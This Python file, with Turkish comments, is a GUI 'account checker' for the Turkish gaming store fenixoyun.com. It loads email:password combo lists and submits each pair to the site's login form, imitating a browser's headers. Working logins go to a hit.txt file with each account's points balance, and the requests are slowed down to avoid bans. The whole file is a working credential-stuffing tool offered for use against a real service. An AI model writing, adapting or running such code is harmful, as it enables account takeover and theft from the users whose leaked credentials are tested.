import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import requests
import re
import time
import threading
from queue import Queue

# ────────────────────────────────────────────────
# CHECKER FONKSİYONU (önceki kodun aynısı, ufak sadeleştirme)
# ────────────────────────────────────────────────

def try_login(email, password, session=None):
    if session is None:
        session = requests.Session()

    # GET → OCSESSID
    headers_get = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0",
        "Accept-Language": "tr-TR,tr;q=0.9",
    }
    try:
        session.get("https://fenixoyun.com/giris", headers=headers_get, timeout=10)
    except:
        return "ERROR", "Bağlantı sorunu"

    ocsessid = session.cookies.get("OCSESSID")
    if not ocsessid:
        return "ERROR", "Cookie alınamadı"

    # POST
    login_data = {
        "email": (None, email.strip()),
        "password": (None, password.strip()),
    }

    headers_post = {
        "Origin": "https://fenixoyun.com",
        "Referer": "https://fenixoyun.com/giris",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Opera GX";v="128"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0",
        "Cookie": f"OCSESSID={ocsessid}; language=tr-tr;",
    }

    try:
        resp = session.post(
            "https://fenixoyun.com/giris",
            data=login_data,
            headers=headers_post,
            allow_redirects=True,
            timeout=12
        )
    except:
        return "ERROR", "POST hatası"

    html_lower = resp.text.lower()

    if "e-posta adresiniz ya da parolanız yanlış!" in html_lower:
        return "FAIL", None

    if "siparişlerim" in html_lower:
        bakiye = "Bilinmiyor"
        match = re.search(r'puan bakiyeniz</div><div class="fx-points-value">(.*?)</div>', resp.text, re.I | re.S)
        if match:
            bakiye = match.group(1).strip()
        return "HIT", bakiye

    return "UNKNOWN", None


# ────────────────────────────────────────────────
# GUI ve CHECKER THREAD
# ────────────────────────────────────────────────

class CheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SMSonay Account Checker v4 - WASD POWER")
        self.root.geometry("620x520")
        self.root.configure(bg="#0d0d0d")
        self.root.resizable(False, False)

        self.accounts = []
        self.is_running = False
        self.stop_event = threading.Event()
        self.result_queue = Queue()

        # Başlık
        tk.Label(
            root, text="SMSONAY ACCOUNT CHECKER v4", fg="#00aaff", bg="#0d0d0d",
            font=("Arial", 22, "bold")
        ).pack(pady=(20, 10))

        # Durum label
        self.status_label = tk.Label(
            root, text="Liste Bekleniyor...", fg="white", bg="#0d0d0d",
            font=("Arial", 14)
        )
        self.status_label.pack(pady=5)

        # Sayaç frame
        counter_frame = tk.Frame(root, bg="#0d0d0d")
        counter_frame.pack(pady=10)

        self.hits_label = tk.Label(counter_frame, text="HITS: 0", fg="#00ff00", bg="#0d0d0d", font=("Arial", 16, "bold"))
        self.hits_label.pack(side="left", padx=30)

        self.fails_label = tk.Label(counter_frame, text="FAILS: 0", fg="#ff4444", bg="#0d0d0d", font=("Arial", 16, "bold"))
        self.fails_label.pack(side="left", padx=30)

        self.remaining_label = tk.Label(counter_frame, text="KALAN: 0", fg="yellow", bg="#0d0d0d", font=("Arial", 16, "bold"))
        self.remaining_label.pack(side="left", padx=30)

        # Siyah kutu (log alanı yerine basit placeholder)
        self.black_box = tk.Frame(root, bg="black", width=560, height=220, bd=2, relief="sunken")
        self.black_box.pack(pady=15)
        self.black_box.pack_propagate(False)

        # Butonlar
        btn_frame = tk.Frame(root, bg="#0d0d0d")
        btn_frame.pack(pady=10)

        self.load_btn = tk.Button(
            btn_frame, text="LİSTE YÜKLE (.txt)", bg="#444444", fg="white",
            font=("Arial", 12, "bold"), width=18, command=self.load_list
        )
        self.load_btn.pack(side="left", padx=20)

        self.start_btn = tk.Button(
            btn_frame, text="BAŞLAT", bg="#0066ff", fg="white",
            font=("Arial", 14, "bold"), width=15, command=self.start_checking
        )
        self.start_btn.pack(side="left", padx=20)

        self.stop_btn = tk.Button(
            btn_frame, text="DURDUR", bg="#ff3333", fg="white",
            font=("Arial", 14, "bold"), width=15, command=self.stop_checking,
            state="disabled"
        )
        self.stop_btn.pack(side="left", padx=20)

        # Sonuçları GUI'ye yansıt (her 300ms kontrol)
        self.root.after(300, self.process_queue)

    def load_list(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if not file_path:
            return

        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line.strip()]

            self.accounts = []
            for line in lines:
                try:
                    email, pwd = line.split(":", 1)
                    self.accounts.append((email.strip(), pwd.strip()))
                except:
                    pass

            count = len(self.accounts)
            self.status_label.config(text=f"{count} hesap yüklendi")
            self.remaining_label.config(text=f"KALAN: {count}")
            messagebox.showinfo("Bilgi", f"{count} geçerli hesap yüklendi.")
        except Exception as e:
            messagebox.showerror("Hata", f"Dosya okunamadı:\n{e}")

    def start_checking(self):
        if not self.accounts:
            messagebox.showwarning("Uyarı", "Önce liste yükleyin!")
            return

        if self.is_running:
            return

        self.is_running = True
        self.stop_event.clear()

        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.load_btn.config(state="disabled")

        self.hits = 0
        self.fails = 0
        self.hits_label.config(text="HITS: 0")
        self.fails_label.config(text="FAILS: 0")
        self.remaining_label.config(text=f"KALAN: {len(self.accounts)}")

        threading.Thread(target=self.checker_thread, daemon=True).start()

    def stop_checking(self):
        if not self.is_running:
            return
        self.stop_event.set()
        self.status_label.config(text="Durduruluyor...")

    def checker_thread(self):
        total = len(self.accounts)
        for i, (email, pwd) in enumerate(self.accounts, 1):
            if self.stop_event.is_set():
                break

            status, bakiye = try_login(email, pwd)

            if status == "HIT":
                self.hits += 1
                line = f"HIT | {email}:{pwd} | Bakiye: {bakiye}"
                with open("hit.txt", "a", encoding="utf-8") as f:
                    f.write(line + "\n")
                self.result_queue.put(("hit", line))
            elif status == "FAIL":
                self.fails += 1
                self.result_queue.put(("fail", f"FAIL | {email}"))
            else:
                self.result_queue.put(("error", f"ERROR | {email}"))

            self.result_queue.put(("update", (self.hits, self.fails, total - i)))

            time.sleep(1.8)  # ban riskini azalt

        self.result_queue.put(("done", None))

    def process_queue(self):
        try:
            while not self.result_queue.empty():
                msg_type, data = self.result_queue.get_nowait()

                if msg_type == "hit":
                    # İstersen log kutusuna ekle
                    pass
                elif msg_type == "fail" or msg_type == "error":
                    pass
                elif msg_type == "update":
                    hits, fails, rem = data
                    self.hits_label.config(text=f"HITS: {hits}")
                    self.fails_label.config(text=f"FAILS: {fails}")
                    self.remaining_label.config(text=f"KALAN: {rem}")
                elif msg_type == "done":
                    self.is_running = False
                    self.start_btn.config(state="normal")
                    self.stop_btn.config(state="disabled")
                    self.load_btn.config(state="normal")
                    self.status_label.config(text="İşlem tamamlandı!")
                    messagebox.showinfo("Tamamlandı", f"Hits: {self.hits} | Fails: {self.fails}")

        except:
            pass

        self.root.after(300, self.process_queue)


if __name__ == "__main__":
    root = tk.Tk()
    app = CheckerApp(root)
    root.mainloop()
